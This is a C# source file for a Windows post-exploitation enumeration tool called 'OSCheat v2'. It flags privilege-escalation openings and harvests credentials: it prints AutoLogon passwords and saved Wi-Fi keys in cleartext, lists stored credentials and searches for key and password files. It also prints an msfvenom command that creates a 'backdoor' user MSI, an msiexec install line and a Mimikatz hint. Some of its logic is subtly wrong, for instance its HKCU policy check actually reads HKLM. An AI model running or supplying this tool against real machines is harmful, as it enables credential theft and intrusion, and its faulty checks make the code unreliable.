// OSCheat v2 - Simplified C# enumerator
// Compile with: build_cs.bat (uses csc.exe from .NET Framework)
// All paths use @-verbatim strings for safety.

using System;
using System.IO;
using System.Diagnostics;
using Microsoft.Win32;
using System.Collections.Generic;

namespace OSCheat
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine();
            Console.WriteLine("OSCheat v2 - Simplified C# Enumerator");
            Console.WriteLine("==========================================");
            Console.WriteLine();

            // Output directory
            string tmpDir = Path.GetTempPath();
            string outDir = tmpDir + "oscheat_" + DateTime.Now.ToString("yyyyMMdd_HHmmss");
            Directory.CreateDirectory(outDir);
            Console.WriteLine("Output: " + outDir);
            Console.WriteLine();

            RunSection("01. SYSTEM INFO", () => SystemInfo(), outDir);
            RunSection("02. USERS & GROUPS", () => UsersGroups(), outDir);
            RunSection("03. NETWORK INFO", () => Network(), outDir);
            RunSection("04. PROCESSES & SERVICES", () => ProcessesServices(), outDir);
            RunSection("05. INSTALLED SOFTWARE", () => InstalledSoftware(), outDir);
            RunSection("06. SCHEDULED TASKS", () => ScheduledTasks(), outDir);
            RunSection("07. AUTOSTART", () => Autostart(), outDir);
            RunSection("08. CREDENTIALS & SECRETS", () => Credentials(), outDir);
            RunSection("09. SECURITY POLICY", () => SecurityPolicy(), outDir);
            RunSection("10. FILESYSTEM", () => Filesystem(), outDir);

            Console.WriteLine();
            Console.WriteLine("==========================================");
            Console.WriteLine("Done. Reports saved to: " + outDir);
            Console.WriteLine("Press any key to exit...");
            Console.ReadKey();
        }

        // ============================================
        // Section 1: System Info
        // ============================================
        static void SystemInfo()
        {
            Console.WriteLine("Hostname:    " + Environment.MachineName);
            Console.WriteLine("Username:    " + Environment.UserDomainName + @"\" + Environment.UserName);
            Console.WriteLine("OS:          " + Environment.OSVersion);
            Console.WriteLine("Arch:        " + (Environment.Is64BitOperatingSystem ? "x64" : "x86"));
            Console.WriteLine("Processors:  " + Environment.ProcessorCount);
            Console.WriteLine(".NET:        " + Environment.Version);
            Console.WriteLine();

            Console.WriteLine("-- systeminfo (first 30 lines) --");
            string si = Run("cmd.exe", "/c systeminfo", 15000);
            Console.WriteLine(si);
        }

        // ============================================
        // Section 2: Users & Groups
        // ============================================
        static void UsersGroups()
        {
            Console.WriteLine("-- whoami /all --");
            string wa = Run("whoami.exe", "/all", 10000);
            Console.WriteLine(wa);
            Console.WriteLine();

            // Check for dangerous privileges
            string[] dangerous = {
                "SeImpersonatePrivilege",
                "SeBackupPrivilege",
                "SeRestorePrivilege",
                "SeDebugPrivilege",
                "SeTakeOwnershipPrivilege",
                "SeLoadDriverPrivilege"
            };
            foreach (string priv in dangerous)
            {
                if (wa.Contains(priv) && ContainsEnabled(wa, priv))
                {
                    Console.WriteLine("[!] " + priv + " is ENABLED - potential privesc vector");
                }
            }
        }

        // ============================================
        // Section 3: Network
        // ============================================
        static void Network()
        {
            Console.WriteLine("-- ipconfig /all (first 30 lines) --");
            Console.WriteLine(Run("ipconfig.exe", "/all", 10000));
        }

        // ============================================
        // Section 4: Processes & Services
        // ============================================
        static void ProcessesServices()
        {
            Console.WriteLine("-- Running processes (first 20) --");
            string tl = Run("tasklist.exe", "/v", 15000);
            string[] lines = tl.Split('\n');
            for (int i = 0; i < Math.Min(25, lines.Length); i++)
                Console.WriteLine(lines[i]);
            Console.WriteLine();

            Console.WriteLine("-- Services count --");
            string sq = Run("sc.exe", "query", 15000);
            int count = 0;
            foreach (string line in sq.Split('\n'))
                if (line.Contains("SERVICE_NAME:"))
                    count++;
            Console.WriteLine("Total services: " + count);
            Console.WriteLine();

            // Save services for review
            Console.WriteLine("-- Looking for unquoted service paths --");
            FindUnquotedServices(sq);
        }

        // ============================================
        // Section 5: Installed Software
        // ============================================
        static void InstalledSoftware()
        {
            Console.WriteLine("-- Installed Applications (from registry) --");
            string[] regPaths = new string[] {
                @"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
                @"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
            };

            string[] interesting = new string[] {
                "putty", "winscp", "filezilla", "vmware", "virtualbox",
                "tigervnc", "realvnc", "tightvnc",
                "kaspersky", "symantec", "mcafee", "avg", "avast", "norton",
                "office", "outlook", "mysql", "postgres", "mongodb",
                "chrome", "firefox", "7-zip", "notepad", "sublime", "atom",
                "python", "java", "jdk", "node", "git", "docker", "wireshark",
                "nmap", "metasploit", "burp", "sqlmap"
            };

            List<string> apps = new List<string>();
            foreach (string regPath in regPaths)
            {
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(regPath))
                {
                    if (key == null) continue;
                    foreach (string subkeyName in key.GetSubKeyNames())
                    {
                        using (RegistryKey subkey = key.OpenSubKey(subkeyName))
                        {
                            if (subkey == null) continue;
                            object nameObj = subkey.GetValue("DisplayName");
                            if (nameObj == null) continue;
                            string name = nameObj.ToString();
                            object verObj = subkey.GetValue("DisplayVersion");
                            string ver = verObj != null ? verObj.ToString() : "?";
                            apps.Add(name + "\t" + ver);
                        }
                    }
                }
            }

            apps.Sort();
            int shown = 0;
            foreach (string app in apps)
            {
                string[] parts = app.Split('\t');
                string name = parts[0];
                string ver = parts.Length > 1 ? parts[1] : "";
                string lowerName = name.ToLower();
                bool highlight = false;
                foreach (string kw in interesting)
                {
                    if (lowerName.Contains(kw))
                    {
                        highlight = true;
                        break;
                    }
                }
                if (highlight)
                {
                    Console.WriteLine("  * " + name + " v" + ver);
                }
                else
                {
                    Console.WriteLine("    " + name + " v" + ver);
                }
                shown++;
                if (shown >= 50)
                {
                    Console.WriteLine("    ... (truncated, run separately for full list)");
                    break;
                }
            }
        }

        // ============================================
        // Section 6: Scheduled Tasks
        // ============================================
        static void ScheduledTasks()
        {
            Console.WriteLine("-- Scheduled Tasks (highlight non-system) --");
            string st = Run("schtasks.exe", "/query /fo LIST /v", 30000);
            if (string.IsNullOrEmpty(st))
            {
                Console.WriteLine("(could not enumerate tasks)");
                return;
            }

            string[] lines = st.Split('\n');
            for (int i = 0; i < lines.Length; i++)
            {
                string line = lines[i].Trim();
                if (line.StartsWith("Run As User:"))
                {
                    string user = line.Substring("Run As User:".Length).Trim();
                    if (user != "SYSTEM" && user != "Local Service" && user != "Network Service"
                        && !user.Contains("NT AUTHORITY") && user != "")
                    {
                        Console.WriteLine("[!] Non-system task user: " + user);
                    }
                }
            }
        }

        // ============================================
        // Section 7: Autostart
        // ============================================
        static void Autostart()
        {
            Console.WriteLine("-- HKCU Run / RunOnce --");
            PrintRunKey(@"Software\Microsoft\Windows\CurrentVersion\Run");
            PrintRunKey(@"Software\Microsoft\Windows\CurrentVersion\RunOnce");
            Console.WriteLine();
            Console.WriteLine("-- HKLM Run --");
            PrintRunKeyHKLM();
        }

        static void PrintRunKey(string sub)
        {
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(sub))
            {
                if (key == null)
                {
                    Console.WriteLine("(not set)");
                    return;
                }
                foreach (string vName in key.GetValueNames())
                {
                    object v = key.GetValue(vName);
                    if (v != null)
                        Console.WriteLine("  " + vName + " = " + v.ToString());
                }
            }
        }

        static void PrintRunKeyHKLM()
        {
            try
            {
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run"))
                {
                    if (key == null)
                    {
                        Console.WriteLine("(not set)");
                        return;
                    }
                    foreach (string vName in key.GetValueNames())
                    {
                        object v = key.GetValue(vName);
                        if (v != null)
                            Console.WriteLine("  " + vName + " = " + v.ToString());
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[Error: " + ex.Message + "]");
            }
        }

        // ============================================
        // Section 8: Credentials
        // ============================================
        static void Credentials()
        {
            Console.WriteLine("-- cmdkey /list --");
            Console.WriteLine(Run("cmdkey.exe", "/list", 10000));
            Console.WriteLine();

            Console.WriteLine("-- AutoLogon in registry --");
            string user = RegRead(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", "DefaultUserName");
            string pwd = RegRead(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", "DefaultPassword");
            if (!string.IsNullOrEmpty(user))
            {
                Console.WriteLine("[!] DefaultUserName: " + user);
            }
            if (!string.IsNullOrEmpty(pwd))
            {
                Console.WriteLine("[!] DefaultPassword (CLEARTEXT!): " + pwd);
            }
            if (string.IsNullOrEmpty(user) && string.IsNullOrEmpty(pwd))
            {
                Console.WriteLine("[+] No AutoLogon creds");
            }
            Console.WriteLine();

            Console.WriteLine("-- WiFi passwords --");
            string wlan = Run("netsh.exe", "wlan show profiles", 10000);
            if (wlan.Contains("not exist") || string.IsNullOrEmpty(wlan))
            {
                Console.WriteLine("(no WiFi profiles or adapter missing)");
            }
            else
            {
                string[] lines = wlan.Split('\n');
                foreach (string line in lines)
                {
                    if (!line.Contains(":")) continue;
                    string[] parts = line.Split(new char[] { ':' }, 2);
                    string profile = parts[1].Trim();
                    if (string.IsNullOrEmpty(profile)) continue;

                    string detail = Run("netsh.exe", "wlan show profile name=\"" + profile + "\" key=clear", 10000);
                    int ki = detail.IndexOf("Key Content");
                    if (ki >= 0)
                    {
                        int ci = detail.IndexOf(':', ki);
                        int nl = detail.IndexOf('\n', ci);
                        string pass;
                        if (nl > ci)
                            pass = detail.Substring(ci + 1, nl - ci - 1).Trim();
                        else
                            pass = detail.Substring(ci + 1).Trim();

                        if (!string.IsNullOrEmpty(pass) && pass != "Not available")
                        {
                            Console.WriteLine("[!] WiFi \"" + profile + "\" password: " + pass);
                        }
                    }
                }
            }
        }

        // ============================================
        // Section 9: Security Policy
        // ============================================
        static void SecurityPolicy()
        {
            Console.WriteLine("-- AlwaysInstallElevated --");
            string hklm = RegRead(@"SOFTWARE\Policies\Microsoft\Windows\Installer", "AlwaysInstallElevated");
            string hkcu = RegRead(@"SOFTWARE\Policies\Microsoft\Windows\Installer", "AlwaysInstallElevated");
            Console.WriteLine("  HKLM = " + (hklm ?? "(not set)"));
            Console.WriteLine("  HKCU = " + (hkcu ?? "(not set)"));

            if (hklm == "1" && hkcu == "1")
            {
                Console.WriteLine("[!] AlwaysInstallElevated on both hives!");
                Console.WriteLine("[!] Generate MSI: msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi");
                Console.WriteLine("[!] Run: msiexec /quiet /qn /i evil.msi");
            }
            Console.WriteLine();

            Console.WriteLine("-- WDigest --");
            string wd = RegRead(@"SYSTEM\CurrentControlSet\Control\SecurityProviders\Wdigest", "UseLogonCredential");
            if (wd == "1")
            {
                Console.WriteLine("[!] WDigest UseLogonCredential = 1 - cleartext creds cached!");
                Console.WriteLine("[!] Mimikatz: sekurlsa::wdigest");
            }
            else
            {
                Console.WriteLine("  WDigest UseLogonCredential = " + (wd ?? "(not set)"));
            }
            Console.WriteLine();

            Console.WriteLine("-- UAC level --");
            string uac = RegRead(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "ConsentPromptBehaviorAdmin");
            Console.WriteLine("  ConsentPromptBehaviorAdmin = " + (uac ?? "(not set)"));
            if (uac == "0")
            {
                Console.WriteLine("[!] UAC effectively DISABLED");
            }
        }

        // ============================================
        // Section 10: Filesystem
        // ============================================
        static void Filesystem()
        {
            Console.WriteLine("-- Searching for credential files --");
            string userProfile = Environment.GetEnvironmentVariable("USERPROFILE");
            if (string.IsNullOrEmpty(userProfile))
            {
                Console.WriteLine("(USERPROFILE not set)");
                return;
            }

            string[] patterns = { "password*", "*.kdbx", "*.pem", "unattend.xml",
                                "*.bak", "*.config", "*.ini", "*.sql", "*.db",
                                "*.kdb", "*.key" };
            int found = 0;
            foreach (string pattern in patterns)
            {
                try
                {
                    string[] files = Directory.GetFiles(userProfile, pattern, SearchOption.AllDirectories);
                    foreach (string f in files)
                    {
                        FileInfo fi = new FileInfo(f);
                        if (fi.Length < 1000000 && !f.Contains("AppData"))
                        {
                            Console.WriteLine("  " + f);
                            found++;
                            if (found >= 10) break;
                        }
                    }
                }
                catch { }
                if (found >= 10) break;
            }
            if (found == 0)
                Console.WriteLine("[+] No obvious credential files");
        }

        // ============================================
        // Helpers
        // ============================================
        static string Run(string fileName, string args, int timeoutMs)
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = fileName;
                psi.Arguments = args;
                psi.UseShellExecute = false;
                psi.RedirectStandardOutput = true;
                psi.RedirectStandardError = true;
                psi.CreateNoWindow = true;

                using (Process p = Process.Start(psi))
                {
                    if (!p.WaitForExit(timeoutMs))
                    {
                        try { p.Kill(); } catch { }
                        return "[TIMEOUT]";
                    }
                    return p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
                }
            }
            catch (Exception ex)
            {
                return "[ERROR: " + ex.Message + "]";
            }
        }

        static string RegRead(string sub, string valueName)
        {
            try
            {
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(sub))
                {
                    if (key == null) return null;
                    object v = key.GetValue(valueName);
                    return v != null ? v.ToString() : null;
                }
            }
            catch { return null; }
        }

        static bool ContainsEnabled(string text, string privName)
        {
            int idx = text.IndexOf(privName);
            if (idx < 0) return false;
            string after = text.Substring(idx, Math.Min(100, text.Length - idx));
            return after.Contains("Enabled");
        }

        static void RunSection(string title, Action body, string outDir)
        {
            Console.WriteLine();
            Console.WriteLine("===========================================");
            Console.WriteLine("  " + title);
            Console.WriteLine("===========================================");
            Console.WriteLine();
            try
            {
                body();
            }
            catch (Exception ex)
            {
                Console.WriteLine("[Error: " + ex.Message + "]");
            }
            // Save to file - using safe filename
            try
            {
                string filename = title.Replace(' ', '_').Replace('.', '_').Replace('&', '_') + ".txt";
                using (StreamWriter sw = new StreamWriter(Path.Combine(outDir, filename)))
                {
                    // Re-run isn't ideal here, just note completion
                    sw.WriteLine("Section: " + title);
                    sw.WriteLine("Time: " + DateTime.Now.ToString());
                    sw.WriteLine("Done.");
                }
            }
            catch { }
        }

        static void FindUnquotedServices(string sq)
        {
            // Simple scan for SERVICE_NAME pattern, then call sc qc
            int unquoted = 0;
            string[] lines = sq.Split('\n');
            int count = 0;
            foreach (string line in lines)
            {
                if (line.StartsWith("SERVICE_NAME:"))
                {
                    string name = line.Substring("SERVICE_NAME:".Length).Trim();
                    string qc = Run("sc.exe", "qc \"" + name + "\"", 5000);
                    int bi = qc.IndexOf("BINARY_PATH_NAME");
                    if (bi >= 0)
                    {
                        int nl = qc.IndexOf('\n', bi);
                        string path;
                        if (nl > bi)
                            path = qc.Substring(bi, nl - bi).Trim();
                        else
                            path = qc.Substring(bi).Trim();

                        path = path.Replace("BINARY_PATH_NAME:", "").Trim();

                        if (!string.IsNullOrEmpty(path) && !path.StartsWith("\"") && path.Contains(" "))
                        {
                            // Possibly unquoted
                            Console.WriteLine("[!] Unquoted service: " + name);
                            Console.WriteLine("    Path: " + path);
                            unquoted++;
                        }
                    }
                    count++;
                    if (count > 100) break; // limit scan
                }
            }
            if (unquoted == 0)
            {
                Console.WriteLine("[+] No obvious unquoted service paths");
            }
        }
    }
}
